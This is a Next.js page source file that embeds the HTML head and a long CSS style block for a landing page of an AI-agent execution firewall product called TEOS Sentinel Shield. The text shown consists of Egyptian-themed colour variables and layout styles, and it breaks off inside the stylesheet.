// app/page.tsx
// TEOS Sentinel Shield — Egyptian Sovereign Landing Page
// Next.js App Router — CLIENT COMPONENT (useEffect DOM takeover)
// Egyptian color system: Lapis · Gold · Carnelian · Alabaster · Kohl

'use client'

const HTML = `<!DOCTYPE html>
<html lang="en" dir="ltr">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>TEOS Sentinel Shield — AI Execution Firewall</title>
<meta name="description" content="Pre-execution security for autonomous AI agents. BLOCK threats before execution. Built in Alexandria, Egypt. 25 rules. 37 tests passing.">
<meta property="og:title" content="TEOS Sentinel Shield — AI Execution Firewall">
<meta property="og:description" content="Your AI agent runs anything. We decide what executes.">
<link rel="preconnect" href="https://fonts.googleapis.com">
<link href="https://fonts.googleapis.com/css2?family=Cinzel:wght@400;600;700;900&family=JetBrains+Mono:wght@400;500;700&family=Fraunces:ital,wght@0,400;0,700;0,900;1,400&display=swap" rel="stylesheet">
<style>
/* ═══════════════════════════════════════════════
   EGYPTIAN SOVEREIGN COLOR SYSTEM
   Lapis · Gold · Carnelian · Alabaster · Kohl
   ═══════════════════════════════════════════════ */
:root {
  --kohl:            #05040a;
  --kohl-mid:        #09080f;
  --kohl-surface:    #0e0c16;
  --kohl-raised:     #131020;
  --border-1:        #1a1628;
  --border-2:        #251f3a;
  --border-3:        #32294d;
  --gold:            #d4a843;
  --gold-bright:     #f0c55a;
  --gold-dim:        #8a6a1f;
  --gold-deep:       #5c4610;
  --gold-glow:       rgba(212,168,67,0.15);
  --gold-trace:      rgba(212,168,67,0.06);
  --lapis:           #1e4d8c;
  --lapis-bright:    #2e6bbf;
  --lapis-dim:       #122d54;
  --carnelian:       #c0391b;
  --carnelian-bright:#e8502a;
  --turquoise:       #00b899;
  --turquoise-bright:#00d4b0;
  --amber:           #d4750a;
  --amber-bright:    #f09020;
  --alabaster:       #ede8d8;
  --alabaster-dim:   #9e9680;
  --alabaster-faint: #3d3928;
  --font-display:    'Cinzel', 'Times New Roman', serif;
  --font-mono:       'JetBrains Mono', monospace;
  --font-serif:      'Fraunces', Georgia, serif;
}

*,*::before,*::after { margin:0; padding:0; box-sizing:border-box; }
html { scroll-behavior:smooth; }

body {
  background: var(--kohl);
  color: var(--alabaster);
  font-family: var(--font-mono);
  line-height: 1.6;
  overflow-x: hidden;
}

body::before {
  content: '';
  position: fixed; inset: 0; z-index: 0; pointer-events: none;
  background-image:
    radial-gradient(ellipse 120% 60% at 50% 0%, rgba(212,168,67,0.07) 0%, transparent 60%),
    linear-gradient(rgba(212,168,67,0.018) 1px, transparent 1px),
    linear-gradient(90deg, rgba(212,168,67,0.018) 1px, transparent 1px),
    linear-gradient(rgba(30,77,140,0.015) 1px, transparent 1px),
    linear-gradient(90deg, rgba(30,77,140,0.015) 1px, transparent 1px);
  background-size: 100% 100%, 60px 60px, 60px 60px, 180px 180px, 180px 180px;
}

.egy-corner {
  position: absolute; width: 32px; height: 32px;
  border-color: var(--gold-dim); border-style: solid; opacity: 0.4;
}
.egy-corner.tl { top:16px; left:16px; border-width:2px 0 0 2px; }
.egy-corner.tr { top:16px; right:16px; border-width:2px 2px 0 0; }
.egy-corner.bl { bottom:16px; left:16px; border-width:0 0 2px 2px; }
.egy-corner.br { bottom:16px; right:16px; border-width:0 2px 2px 0; }

/* ── NAV ── */
nav {
  position: fixed; top:0; left:0; right:0; z-index:200;
  display: flex; align-items:center; justify-content:space-between;
  padding: 16px 56px;
  background: rgba(5,4,10,0.95);
  border-bottom: 1px solid var(--border-1);
  backdrop-filter: blur(20px);
}
nav::after {
  content: '';
  position: absolute; bottom:-1px; left:0; right:0; height:1px;
  background: linear-gradient(90deg, transparent, var(--gold-dim), var(--lapis-dim), var(--gold-dim), transparent);
}
.nav-brand { display:flex; align-items:center; gap:12px; text-decoration:none; }
.brand-ankh {
  width:36px; height:36px;
  background: linear-gradient(135deg, var(--gold) 0%, var(--gold-dim) 100%);
  clip-path: polygon(50% 0%,100% 25%,100% 75%,50% 100%,0% 75%,0% 25%);
  display:flex; align-items:center; justify-content:center;
  font-size:16px;
  box-shadow: 0 0 20px rgba(212,168,67,0.3);
}
.brand-name {
  font-family: var(--font-display);
  font-weight:700; font-size:15px;
  letter-spacing:0.15em; color:var(--gold); text-transform:uppercase;
}
.nav-links { display:flex; align-items:center; gap:32px; list-style:none; }
.nav-links a {
  color:var(--alabaster-dim); text-decoration:none;
  font-size:11px; letter-spacing:0.1em; text-transform:uppercase;
  font-family:var(--font-display); transition:color 0.2s;
}
.nav-links a:hover { color:var(--gold); }
.nav-cta {
  background: linear-gradient(135deg, var(--gold) 0%, var(--gold-dim) 100%) !important;
  color: var(--kohl) !important; padding:8px 20px !important; font-weight:700 !important;
  font-family:var(--font-display) !important; letter-spacing:0.08em !important;
  border-radius:1px !important; font-size:11px !important;
  box-shadow:0 0 20px rgba(212,168,67,0.2) !important; transition:all 0.2s !important;
}
.nav-cta:hover {
  background: linear-gradient(135deg, var(--gold-bright) 0%, var(--gold) 100%) !important;
  box-shadow:0 0 30px rgba(212,168,67,0.4) !important; transform:translateY(-1px) !important;
}

/* ── LANG SWITCHER ── */
.lang-switcher { position:relative; display:flex; align-items:center; }
.lang-btn {
  display:flex; align-items:center; gap:7px;
  background:rgba(212,168,67,0.06); border:1px solid var(--border-3);
  color:var(--alabaster-dim); cursor:pointer; font-family:var(--font-display);
  font-size:10px; letter-spacing:0.1em; padding:6px 12px; border-radius:1px; transition:all 0.2s;
}
.lang-btn:hover { border-color:var(--gold-dim); color:var(--gold); }
.lang-btn .lang-arrow { font-size:8px; opacity:0.4; transition:transform 0.2s; }
.lang-btn.open .lang-arrow { transform:rotate(180deg); }
.lang-dropdown {
  position:absolute; top:calc(100% + 6px); right:0;
  background:var(--kohl-surface); border:1px solid var(--border-2);
  border-top:2px solid var(--gold-dim); min-width:175px;
  box-shadow:0 20px 50px rgba(0,0,0,0.7); display:none; z-index:300;
}
.lang-dropdown.open { display:block; animation:dropIn 0.15s ease; }
@keyframes dropIn { from{opacity:0;transform:translateY(-6px)} to{opacity:1;transform:translateY(0)} }
.lang-option {
  display:flex; align-items:center; gap:10px; padding:10px 14px; cursor:pointer;
  font-family:var(--font-display); font-size:11px; color:var(--alabaster-dim);
  transition:background 0.15s; border:none; background:transparent;
  width:100%; text-align:left; letter-spacing:0.06em;
}
.lang-option:hover { background:var(--kohl-raised); color:var(--alabaster); }
.lang-option.active { color:var(--gold); background:rgba(212,168,67,0.06); }
.lang-option .lo-flag { font-size:16px; }
.lang-option .lo-native { font-size:10px; color:var(--alabaster-faint); margin-left:auto; }

/* ── STATUS BAR ── */
.status-bar {
  position:fixed; top:69px; left:0; right:0; z-index:199;
  background:rgba(0,184,153,0.05); border-bottom:1px solid rgba(0,184,153,0.1);
  display:flex; align-items:center; justify-content:center;
  gap:28px; padding:7px 24px;
  font-family:var(--font-mono); font-size:10px; letter-spacing:0.1em; color:var(--alabaster-dim);
}
.status-item { display:flex; align-items:center; gap:6px; }
.status-dot {
  width:5px; height:5px; border-radius:50%;
  background:var(--turquoise); box-shadow:0 0 6px var(--turquoise);
  animation:pulse 2s ease-in-out infinite;
}
@keyframes pulse { 0%,100%{opacity:1;transform:scale(1)} 50%{opacity:0.5;transform:scale(0.8)} }

/* ── TRANSLATE BAR + TOAST ── */
.translate-bar {
  position:fixed; top:0; left:0; right:0; z-index:9999;
  height:2px; background:var(--border-1); display:none;
}
.translate-bar-fill {
  height:100%; background:linear-gradient(90deg, var(--lapis), var(--gold));
  width:0%; transition:width 0.3s ease;
}
.translate-toast {
  position:fixed; bottom:24px; left:50%; transform:translateX(-50%);
  background:var(--kohl-surface); border:1px solid var(--border-2);
  border-left:3px solid var(--gold-dim); padding:10px 18px;
  font-family:var(--font-mono); font-size:11px; color:var(--alabaster-dim);
  box-shadow:0 8px 40px rgba(0,0,0,0.6); display:none; z-index:9999;
  white-space:nowrap; align-items:center; gap:8px;
}
.translate-toast.show { display:flex; animation:toastIn 0.2s ease; }
@keyframes toastIn {
  from{opacity:0;transform:translateX(-50%) translateY(8px)}
  to{opacity:1;transform:translateX(-50%) translateY(0)}
}

/* ── HERO ── */
.hero {
  position:relative; min-height:100vh;
  display:flex; flex-direction:column; align-items:center; justify-content:center;
  padding:180px 64px 120px; text-align:center; overflow:hidden;
}
.hero-sun {
  position:absolute; top:-100px; left:50%; transform:translateX(-50%);
  width:600px; height:600px; border-radius:50%; pointer-events:none;
  background:radial-gradient(ellipse, rgba(212,168,67,0.12) 0%, rgba(30,77,140,0.06) 40%, transparent 70%);
}
.hero-rays {
  position:absolute; top:0; left:50%; transform:translateX(-50%);
  width:900px; height:900px; pointer-events:none;
  background: conic-gradient(
    from 0deg,
    transparent 0deg, rgba(212,168,67,0.02) 5deg, transparent 10deg,
    transparent 30deg, rgba(212,168,67,0.02) 35deg, transparent 40deg,
    transparent 60deg, rgba(212,168,67,0.02) 65deg, transparent 70deg,
    transparent 90deg, rgba(212,168,67,0.02) 95deg, transparent 100deg,
    transparent 120deg, rgba(212,168,67,0.02) 125deg, transparent 130deg,
    transparent 150deg, rgba(212,168,67,0.02) 155deg, transparent 160deg,
    transparent 180deg, rgba(212,168,67,0.02) 185deg, transparent 190deg,
    transparent 210deg, rgba(212,168,67,0.02) 215deg, transparent 220deg,
    transparent 240deg, rgba(212,168,67,0.02) 245deg, transparent 250deg,
    transparent 270deg, rgba(212,168,67,0.02) 275deg, transparent 280deg,
    transparent 300deg, rgba(212,168,67,0.02) 305deg, transparent 310deg,
    transparent 330deg, rgba(212,168,67,0.02) 335deg, transparent 340deg
  );
  animation:rotate-rays 60s linear infinite;
}
@keyframes rotate-rays { to { transform:translateX(-50%) rotate(360deg); } }
.sovereignty-badge {
  display:inline-flex; align-items:center; gap:10px;
  border:1px solid var(--gold-dim); background:rgba(212,168,67,0.06);
  padding:7px 20px; border-radius:1px; font-family:var(--font-display);
  font-size:10px; color:var(--gold); letter-spacing:0.18em; text-transform:uppercase;
  margin-bottom:40px; animation:fadeUp 0.6s ease both; position:relative; z-index:1;
}
.hero h1 {
  font-family:var(--font-display); font-weight:900;
  font-size:clamp(40px,6.5vw,88px); line-height:1.05; letter-spacing:0.03em;
  max-width:900px; margin-bottom:28px; animation:fadeUp 0.7s ease 0.1s both;
  position:relative; z-index:1; text-transform:uppercase;
}
.hero h1 .gold { color:var(--gold); }
.hero h1 .strike {
  color:var(--alabaster-dim); text-decoration:line-through;
  text-decoration-color:var(--carnelian); text-decoration-thickness:3px;
}
.hero-divider {
  width:180px; height:1px;
  background:linear-gradient(90deg, transparent, var(--gold), var(--lapis-bright), var(--gold), transparent);
  margin:0 auto 28px; animation:fadeUp 0.7s ease 0.15s both; position:relative; z-index:1;
}
.hero-sub {
  font-family:var(--font-mono); font-size:14px; color:var(--alabaster-dim);
  max-width:580px; line-height:1.9; margin-bottom:48px;
  animation:fadeUp 0.7s ease 0.2s both; position:relative; z-index:1;
}
.hero-sub strong { color:var(--alabaster); }
.hero-ctas {
  display:flex; align-items:center; gap:14px; flex-wrap:wrap; justify-content:center;
  animation:fadeUp 0.7s ease 0.28s both; margin-bottom:14px; position:relative; z-index:1;
}
.btn-primary {
  display:inline-flex; align-items:center; gap:10px;
  background:linear-gradient(135deg, var(--gold) 0%, var(--gold-dim) 100%);
  color:var(--kohl); text-decoration:none; font-family:var(--font-display);
  font-weight:700; font-size:13px; letter-spacing:0.1em; text-transform:uppercase;
  padding:15px 36px; border-radius:1px; transition:all 0.25s; position:relative; overflow:hidden;
  box-shadow:0 0 30px rgba(212,168,67,0.25), 0 4px 20px rgba(0,0,0,0.5);
}
.btn-primary::before {
  content:''; position:absolute; inset:0;
  background:linear-gradient(90deg, transparent, rgba(255,255,255,0.2), transparent);
  transform:translateX(-100%); transition:transform 0.5s;
}
.btn-primary:hover::before { transform:translateX(100%); }
.btn-primary:hover {
  background:linear-gradient(135deg, var(--gold-bright) 0%, var(--gold) 100%);
  transform:translateY(-2px);
  box-shadow:0 0 50px rgba(212,168,67,0.4), 0 8px 30px rgba(0,0,0,0.6);
}
.btn-secondary {
  display:inline-flex; align-items:center; gap:8px;
  border:1px solid var(--border-3); color:var(--alabaster-dim); text-decoration:none;
  font-family:var(--font-display); font-size:11px; letter-spacing:0.1em; text-transform:uppercase;
  padding:15px 28px; border-radius:1px; transition:all 0.2s;
}
.btn-secondary:hover { border-color:var(--gold-dim); color:var(--gold); }
.hero-micro {
  font-size:10px; color:var(--alabaster-faint); letter-spacing:0.1em; text-transform:uppercase;
  animation:fadeUp 0.7s ease 0.36s both; position:relative; z-index:1;
}

/* ── TRUST STRIP ── */
.trust-strip {
  display:flex; align-items:center; margin-top:72px; padding-top:40px;
  border-top:1px solid var(--border-1); animation:fadeUp 0.7s ease 0.44s both;
  position:relative; z-index:1; flex-wrap:wrap; justify-content:center;
}
.trust-item {
  display:flex; align-items:center; gap:10px;
  font-family:var(--font-display); font-size:11px; color:var(--alabaster-dim);
  letter-spacing:0.06em; text-transform:uppercase; padding:0 36px;
  border-right:1px solid var(--border-1);
}
.trust-item:last-child { border-right:none; }
.trust-num {
  font-size:28px; font-weight:900; color:var(--gold);
  font-family:var(--font-display); letter-spacing:-0.02em; line-height:1;
}

/* ── THREAT TICKER ── */
.threat-ticker {
  background:rgba(192,57,27,0.04);
  border-top:1px solid rgba(192,57,27,0.08);
  border-bottom:1px solid rgba(192,57,27,0.08);
  padding:14px 0; overflow:hidden; position:relative; z-index:1;
}
.ticker-inner {
  display:flex; gap:80px;
  animation:ticker 35s linear infinite; white-space:nowrap;
}
.ticker-inner:hover { animation-play-state:paused; }
@keyframes ticker { from{transform:translateX(0)} to{transform:translateX(-50%)} }
.tick-item {
  font-family:var(--font-mono); font-size:11px; color:var(--alabaster-faint);
  display:flex; align-items:center; gap:12px; letter-spacing:0.05em;
}
.tick-block { color:var(--carnelian-bright); font-weight:700; }
.tick-allow { color:var(--turquoise); font-weight:700; }
.tick-warn  { color:var(--amber-bright); font-weight:700; }

/* ── SHARED SECTION ── */
.section-wrap { padding:110px 64px; max-width:1300px; margin:0 auto; position:relative; }
.section-label {
  font-family:var(--font-display); font-size:9px; letter-spacing:0.25em;
  text-transform:uppercase; color:var(--gold-dim); margin-bottom:16px;
  display:flex; align-items:center; gap:10px;
}
.section-label::before {
  content:''; width:24px; height:1px;
  background:linear-gradient(90deg, transparent, var(--gold-dim));
}
.section-title {
  font-family:var(--font-display); font-weight:900;
  font-size:clamp(26px,3.5vw,50px); letter-spacing:0.04em; line-height:1.1;
  text-transform:uppercase; margin-bottom:14px;
}
.section-sub {
  font-family:var(--font-mono); font-size:13px; color:var(--alabaster-dim);
  max-width:540px; line-height:1.8; margin-bottom:60px;
}

/* ── VIDEO ── */
.video-wrapper {
  width:100%; overflow:hidden; border:1px solid var(--gold-dim);
  box-shadow:0 0 80px rgba(212,168,67,0.1), 0 0 0 1px var(--border-1); position:relative;
}
.video-wrapper video {
  width:100%; display:block;
  background:var(--kohl-mid);
}
.video-timeline {
  display:flex; background:var(--kohl-surface); border-top:1px solid var(--border-1);
}
.vt-step { flex:1; padding:14px 18px; border-right:1px solid var(--border-1); }
.vt-step:last-child { border-right:none; }
.vt-time {
  font-family:var(--font-mono); font-size:9px; color:var(--gold-dim);
  letter-spacing:0.1em; margin-bottom:3px;
}
.vt-label { font-family:var(--font-mono); font-size:11px; color:var(--alabaster-dim); }
.vt-code {
  font-family:var(--font-mono); font-size:10px; color:var(--turquoise);
  background:rgba(0,184,153,0.08); padding:1px 6px; border-radius:2px;
}

/* ── TERMINALS ── */
.terminals { display:grid; grid-template-columns:repeat(3,1fr); gap:14px; }
.term {
  background:var(--kohl-surface); border:1px solid var(--border-2); overflow:hidden;
  transition:all 0.25s;
}
.term:hover { border-color:var(--border-3); transform:translateY(-4px); box-shadow:0 20px 50px rgba(0,0,0,0.5); }
.term-bar {
  display:flex; align-items:center; gap:6px; padding:10px 14px;
  border-bottom:1px solid var(--border-1); background:rgba(255,255,255,0.015);
}
.td { width:9px; height:9px; border-radius:50%; }
.td-r { background:#c0392b; } .td-y { background:#d4a017; } .td-g { background:#27ae60; }
.term-tag {
  margin-left:auto; font-family:var(--font-display);
  font-size:9px; color:var(--alabaster-faint); letter-spacing:0.1em; text-transform:uppercase;
}
.term-body { padding:18px; font-family:var(--font-mono); font-size:11px; line-height:2; }
.tp  { color:var(--gold); }
.tc  { color:var(--alabaster); }
.tmt { color:var(--alabaster-faint); }
.tbl { color:var(--carnelian-bright); font-weight:700; font-size:12px; }
.twn { color:var(--amber-bright); font-weight:700; font-size:12px; }
.tok { color:var(--turquoise-bright); font-weight:700; font-size:12px; }
.tsc { color:var(--alabaster-faint); font-size:10px; }
.tr  { color:var(--alabaster-faint); font-size:10px; padding-left:12px; }
.term-verdict {
  padding:12px 18px; border-top:1px solid var(--border-1);
  display:flex; align-items:center; gap:10px;
}
.verdict-pill {
  font-family:var(--font-display); font-size:9px; font-weight:700;
  letter-spacing:0.12em; text-transform:uppercase; padding:3px 10px; border-radius:1px;
}
.v-block { background:rgba(192,57,27,0.15); color:var(--carnelian-bright); border:1px solid rgba(192,57,27,0.3); }
.v-warn  { background:rgba(212,117,10,0.15); color:var(--amber-bright); border:1px solid rgba(212,117,10,0.3); }
.v-allow { background:rgba(0,184,153,0.12); color:var(--turquoise-bright); border:1px solid rgba(0,184,153,0.25); }
.verdict-rule { font-family:var(--font-mono); font-size:10px; color:var(--alabaster-faint); letter-spacing:0.05em; }

/* ── ENGINE STATS ── */
.engine-stats-section {
  background:var(--kohl-mid); border-top:1px solid var(--border-1);
  border-bottom:1px solid var(--border-1); padding:0;
}
.engine-stats-inner {
  max-width:1300px; margin:0 auto;
  display:grid; grid-template-columns:repeat(4,1fr);
  border-left:1px solid var(--border-1);
}
.estat {
  padding:52px 36px; text-align:center; border-right:1px solid var(--border-1);
  position:relative; transition:background 0.2s;
}
.estat:hover { background:var(--kohl-surface); }
.estat::after {
  content:''; position:absolute; top:0; left:0; right:0; height:2px;
  background:linear-gradient(90deg, transparent, var(--gold-dim), transparent);
  opacity:0; transition:opacity 0.2s;
}
.estat:hover::after { opacity:1; }
.estat-num {
  font-family:var(--font-display); font-weight:900; font-size:54px;
  color:var(--gold); letter-spacing:-0.01em; line-height:1; margin-bottom:8px;
  text-shadow:0 0 40px rgba(212,168,67,0.3);
}
.estat-label { font-family:var(--font-display); font-size:9px; color:var(--alabaster-faint); letter-spacing:0.15em; text-transform:uppercase; }
.estat-sub { font-family:var(--font-mono); font-size:10px; color:var(--alabaster-faint); margin-top:4px; }

/* ── FEATURES ── */
.features-bg {
  background:var(--kohl-mid); border-top:1px solid var(--border-1);
  border-bottom:1px solid var(--border-1); padding:110px 0;
}
.features-grid {
  display:grid; grid-template-columns:repeat(3,1fr);
  gap:1px; background:var(--border-1); border:1px solid var(--border-1); margin-top:60px;
}
.feat {
  background:var(--kohl-mid); padding:40px; transition:background 0.2s; position:relative;
}
.feat:hover { background:var(--kohl-raised); }
.feat::before {
  content:''; position:absolute; top:0; left:0; right:0; height:1px;
  background:linear-gradient(90deg, transparent, var(--gold-dim), transparent);
  opacity:0; transition:opacity 0.2s;
}
.feat:hover::before { opacity:1; }
.feat-icon {
  width:50px; height:50px; border:1px solid var(--border-2);
  display:flex; align-items:center; justify-content:center;
  font-size:22px; margin-bottom:20px; background:rgba(212,168,67,0.05);
}
.feat-cmd { font-family:var(--font-mono); font-size:12px; color:var(--turquoise); letter-spacing:0.06em; margin-bottom:10px; }
.feat-title {
  font-family:var(--font-display); font-weight:700; font-size:17px; margin-bottom:10px;
  letter-spacing:0.04em; text-transform:uppercase; color:var(--alabaster);
}
.feat-desc { font-family:var(--font-mono); font-size:11px; color:var(--alabaster-dim); line-height:1.8; }
.feat-tags { display:flex; flex-wrap:wrap; gap:5px; margin-top:16px; }
.ftag {
  font-family:var(--font-mono); font-size:9px; letter-spacing:0.06em;
  padding:2px 8px; border:1px solid var(--border-2); color:var(--alabaster-faint);
}

/* ── HOW IT WORKS ── */
.flow-steps {
  display:grid; grid-template-columns:repeat(4,1fr);
  gap:0; margin-top:60px; position:relative;
}
.flow-steps::before {
  content:''; position:absolute; top:27px; left:12%; right:12%; height:1px;
  background:linear-gradient(90deg, transparent, var(--gold-dim), var(--lapis-dim), var(--gold-dim), transparent);
  opacity:0.5;
}
.flow-step { padding:0 24px; }
.step-n {
  width:54px; height:54px; border:1px solid var(--gold-dim);
  display:flex; align-items:center; justify-content:center;
  font-family:var(--font-display); font-weight:900; font-size:20px;
  color:var(--gold); margin-bottom:24px; background:var(--kohl);
  position:relative; z-index:1; transition:all 0.2s; letter-spacing:0.05em;
}
.flow-step:hover .step-n {
  background:rgba(212,168,67,0.1); border-color:var(--gold);
  box-shadow:0 0 20px rgba(212,168,67,0.2);
}
.step-ti {
  font-family:var(--font-display); font-weight:700; font-size:14px; margin-bottom:10px;
  letter-spacing:0.06em; text-transform:uppercase; color:var(--alabaster);
}
.step-desc { font-family:var(--font-mono); font-size:11px; color:var(--alabaster-dim); line-height:1.7; }

/* ── COMPARE TABLE ── */
.compare-table { width:100%; border-collapse:collapse; margin-top:60px; }
.compare-table th {
  padding:14px 22px; text-align:left; font-family:var(--font-display); font-size:10px;
  font-weight:700; letter-spacing:0.1em; text-transform:uppercase;
  border-bottom:1px solid var(--border-2); color:var(--alabaster-dim);
}
.compare-table th.ours { color:var(--gold); background:rgba(212,168,67,0.04); }
.compare-table td {
  padding:14px 22px; font-size:11px; border-bottom:1px solid var(--border-1);
  color:var(--alabaster-dim); font-family:var(--font-mono);
}
.compare-table td.ours { background:rgba(212,168,67,0.025); }
.compare-table tr:hover td { background:rgba(255,255,255,0.012); }
.compare-table tr:hover td.ours { background:rgba(212,168,67,0.05); }
.cy { color:var(--turquoise-bright); } .cn { color:var(--alabaster-faint); } .cp { color:var(--amber-bright); }

/* ── GOVERNMENT ── */
.gov-tabs { display:flex; margin-bottom:40px; border:1px solid var(--border-2); }
.gov-tab {
  flex:1; padding:12px 20px; text-align:center; font-family:var(--font-display);
  font-size:10px; letter-spacing:0.1em; text-transform:uppercase;
  color:var(--alabaster-dim); cursor:pointer; border:none; background:transparent;
  border-right:1px solid var(--border-2); transition:all 0.2s;
}
.gov-tab:last-child { border-right:none; }
.gov-tab.active { color:var(--gold); background:rgba(212,168,67,0.06); border-bottom:2px solid var(--gold-dim); }
.gov-tab:hover:not(.active) { color:var(--alabaster); background:rgba(255,255,255,0.02); }
.gov-panel { display:none; }
.gov-panel.active { display:block; }
.gov-target {
  display:flex; gap:24px; padding:24px; border:1px solid var(--border-2);
  margin-bottom:10px; background:var(--kohl-surface); transition:all 0.2s;
  position:relative; overflow:hidden;
}
.gov-target::before { content:''; position:absolute; left:0; top:0; bottom:0; width:2px; }
.gov-target.t1::before { background:var(--gold); }
.gov-target.t2::before { background:var(--lapis); }
.gov-target:hover { background:var(--kohl-raised); border-color:var(--border-3); }
.gov-copy { flex:1; }
.gt-tier {
  font-family:var(--font-display); font-size:8px; letter-spacing:0.15em;
  text-transform:uppercase; margin-bottom:4px;
}
.t1 .gt-tier { color:var(--gold-dim); }
.t2 .gt-tier { color:var(--lapis-bright); }
.gt-name {
  font-family:var(--font-display); font-weight:700; font-size:15px;
  color:var(--alabaster); letter-spacing:0.06em; margin-bottom:6px; text-transform:uppercase;
}
.gt-angle { font-family:var(--font-mono); font-size:11px; color:var(--gold); font-style:italic; margin-bottom:8px; }
.gt-desc { font-family:var(--font-mono); font-size:11px; color:var(--alabaster-dim); line-height:1.7; }
.gt-deal {
  flex-shrink:0; font-family:var(--font-display); font-size:11px; color:var(--turquoise);
  letter-spacing:0.06em; text-align:right; white-space:nowrap; padding-left:24px;
}
.outreach-box {
  border:1px solid var(--border-2); border-left:3px solid var(--gold-dim);
  padding:24px 28px; background:rgba(212,168,67,0.03); margin-top:28px;
}
.ob-title {
  font-family:var(--font-display); font-size:9px; letter-spacing:0.2em;
  text-transform:uppercase; color:var(--gold-dim); margin-bottom:14px;
}
.ob-script {
  font-family:var(--font-mono); font-size:12px; color:var(--alabaster-dim);
  line-height:2; border-left:2px solid var(--border-2); padding-left:18px;
}
.ob-script strong { color:var(--alabaster); }
.ob-script .danger { color:var(--carnelian-bright); }
.ob-script .safe   { color:var(--gold); }

/* ── PRICING ── */
.pricing-bg {
  background:var(--kohl-mid); border-top:1px solid var(--border-1);
  border-bottom:1px solid var(--border-1); padding:110px 0;
}
.pricing-grid { display:grid; grid-template-columns:repeat(3,1fr); gap:18px; margin-top:60px; }
.plan {
  background:var(--kohl-surface); border:1px solid var(--border-2);
  padding:40px; position:relative; transition:all 0.2s;
}
.plan:hover { border-color:var(--border-3); transform:translateY(-4px); }
.plan.pop { border-color:var(--gold-dim); background:rgba(212,168,67,0.025); }
.plan.pop:hover { border-color:var(--gold); }
.pop-badge {
  position:absolute; top:-11px; left:50%; transform:translateX(-50%);
  background:linear-gradient(135deg, var(--gold), var(--gold-dim));
  color:var(--kohl); font-family:var(--font-display); font-size:9px;
  font-weight:700; letter-spacing:0.15em; padding:4px 14px; white-space:nowrap;
}
.plan-name { font-family:var(--font-display); font-weight:700; font-size:18px; letter-spacing:0.06em; text-transform:uppercase; margin-bottom:8px; color:var(--alabaster); }
.plan-price { display:flex; align-items:baseline; gap:4px; margin-bottom:6px; }
.price-n {
  font-family:var(--font-display); font-weight:900; font-size:50px; color:var(--gold);
  letter-spacing:-0.02em; text-shadow:0 0 30px rgba(212,168,67,0.25);
}
.price-p { font-size:13px; color:var(--alabaster-faint); font-family:var(--font-mono); }
.plan-tag {
  font-family:var(--font-mono); font-size:11px; color:var(--alabaster-dim);
  margin-bottom:24px; padding-bottom:24px; border-bottom:1px solid var(--border-1);
}
.plan-feats { list-style:none; margin-bottom:28px; }
.plan-feats li {
  font-family:var(--font-mono); font-size:11px; color:var(--alabaster-dim);
  padding:7px 0; display:flex; align-items:center; gap:10px;
}
.plan-feats li::before { content:'𓂀'; color:var(--gold-dim); font-size:12px; flex-shrink:0; }
.btn-plan {
  display:block; text-align:center; padding:12px 24px;
  font-family:var(--font-display); font-weight:700; font-size:12px;
  letter-spacing:0.1em; text-transform:uppercase; text-decoration:none; transition:all 0.2s;
}
.btn-gold {
  background:linear-gradient(135deg, var(--gold), var(--gold-dim));
  color:var(--kohl); box-shadow:0 0 20px rgba(212,168,67,0.2);
}
.btn-gold:hover { box-shadow:0 0 35px rgba(212,168,67,0.4); transform:translateY(-1px); }
.btn-out { border:1px solid var(--border-2); color:var(--alabaster-dim); }
.btn-out:hover { border-color:var(--gold-dim); color:var(--gold); }
.enterprise-row {
  margin-top:36px; border:1px solid var(--border-2); border-left:3px solid var(--gold-dim);
  padding:26px 32px; display:flex; align-items:center; justify-content:space-between;
  gap:24px; background:rgba(212,168,67,0.02);
}
.ent-h { font-family:var(--font-display); font-weight:700; font-size:16px; margin-bottom:5px; letter-spacing:0.04em; text-transform:uppercase; }
.ent-p { font-family:var(--font-mono); font-size:11px; color:var(--alabaster-dim); line-height:1.6; }
.btn-ent {
  display:inline-flex; align-items:center; gap:8px;
  border:1px solid var(--gold-dim); color:var(--gold); text-decoration:none;
  padding:10px 22px; font-family:var(--font-display); font-weight:700; font-size:11px;
  letter-spacing:0.08em; text-transform:uppercase; white-space:nowrap; transition:all 0.2s;
}
.btn-ent:hover { background:rgba(212,168,67,0.08); border-color:var(--gold); box-shadow:0 0 20px rgba(212,168,67,0.15); }

/* ── SOVEREIGN ── */
.sovereign-section {
  padding:110px 64px; max-width:1300px; margin:0 auto;
  display:grid; grid-template-columns:1fr 1fr; gap:80px; align-items:center;
}
.sovereign-copy h2 {
  font-family:var(--font-display); font-weight:900; font-size:clamp(26px,3.5vw,46px);
  letter-spacing:0.04em; line-height:1.1; text-transform:uppercase;
  margin-bottom:20px; color:var(--alabaster);
}
.sovereign-copy h2 .gold { color:var(--gold); }
.sovereign-copy p { font-family:var(--font-mono); font-size:12px; color:var(--alabaster-dim); line-height:1.9; margin-bottom:16px; }
.sovereign-pills { display:flex; flex-wrap:wrap; gap:6px; margin-top:28px; }
.spill {
  font-family:var(--font-display); font-size:9px; letter-spacing:0.1em;
  padding:5px 12px; border:1px solid var(--border-2); color:var(--alabaster-faint);
  text-transform:uppercase; transition:all 0.2s; cursor:default;
}
.spill:hover { border-color:var(--gold-dim); color:var(--gold); }
.sov-metrics { display:grid; grid-template-columns:1fr 1fr; gap:14px; }
.smet {
  background:var(--kohl-surface); border:1px solid var(--border-2);
  padding:26px; transition:all 0.2s;
}
.smet:hover { border-color:var(--border-3); }
.smet-n {
  font-family:var(--font-display); font-weight:900; font-size:34px; color:var(--gold);
  letter-spacing:-0.02em; margin-bottom:5px; text-shadow:0 0 20px rgba(212,168,67,0.2);
}
.smet-l { font-family:var(--font-display); font-size:9px; color:var(--alabaster-faint); letter-spacing:0.12em; text-transform:uppercase; }

/* ── ROADMAP ── */
.roadmap-bg { background:var(--kohl-mid); border-top:1px solid var(--border-1); padding:110px 0; }
.roadmap-grid { display:grid; grid-template-columns:repeat(4,1fr); gap:14px; margin-top:60px; }
.rm-card {
  border:1px solid var(--border-2); padding:26px; position:relative;
  overflow:hidden; transition:all 0.2s; background:var(--kohl-mid);
}
.rm-card:hover { border-color:var(--border-3); transform:translateY(-2px); }
.rm-card.live { border-color:rgba(0,184,153,0.3); background:rgba(0,184,153,0.03); }
.rm-card.live::before {
  content:''; position:absolute; top:0; left:0; right:0; height:2px;
  background:linear-gradient(90deg, var(--turquoise), transparent);
}
.rm-q { font-family:var(--font-display); font-size:9px; letter-spacing:0.15em; text-transform:uppercase; color:var(--alabaster-faint); margin-bottom:12px; }
